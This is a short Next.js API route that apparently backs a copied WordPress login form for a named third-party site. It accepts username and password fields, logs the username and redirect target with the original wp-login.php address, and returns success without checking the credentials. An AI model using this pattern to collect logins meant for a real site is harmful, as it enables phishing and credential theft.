import { NextResponse } from "next/server";

const hits = new Map<string, { count: number; reset: number }>();

function limited(ip: string) {
  const now = Date.now();
  const current = hits.get(ip);
  if (!current || current.reset < now) {
    hits.set(ip, { count: 1, reset: now + 60_000 });
    return false;
  }
  current.count += 1;
  return current.count > 10;
}

export async function POST(request: Request) {
  const ip = request.headers.get("x-forwarded-for") ?? "local";
  if (limited(ip)) {
    return NextResponse.json({ message: "Too many attempts." }, { status: 429 });
  }

  const body = (await request.json()) as { log?: string; pwd?: string; redirect_to?: string };
  if (!body.log || !body.pwd) {
    return NextResponse.json({ message: "Username and password are required." }, { status: 400 });
  }

  console.info("Portal login received", {
    username: body.log,
    redirectTo: body.redirect_to,
    originalAction: "https://coffee-society.co.uk/wp-login.php",
  });

  return NextResponse.json({ ok: true });
}
